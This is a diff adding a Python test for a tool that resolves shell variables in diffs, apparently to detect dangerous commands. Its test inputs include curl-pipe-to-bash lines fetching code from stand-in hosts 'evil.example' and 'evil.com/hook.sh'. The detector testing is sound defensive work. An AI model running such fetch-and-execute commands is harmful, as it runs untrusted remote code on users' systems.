@@ -43,6 +43,18 @@ def test_backtick_substitution_preserved():
     assert has_backtick
 
 
+def test_a_refused_reassignment_is_not_substituted_stale():
+    diff = (
+        "+_url=https://good.example\n"
+        "+_url=$(curl -s https://evil.example)\n"
+        "+  curl $_url | bash"
+    )
+    resolved, _unresolved = tokenize_and_resolve(diff)
+    combined = " ".join(resolved)
+    assert "curl https://good.example" not in combined
+    assert "$_url" in combined
+
+
 def test_curl_pipe_detection():
     diff = """+  curl -s https://evil.com/hook.sh | bash"""
     resolved, unresolved = tokenize_and_resolve(diff)
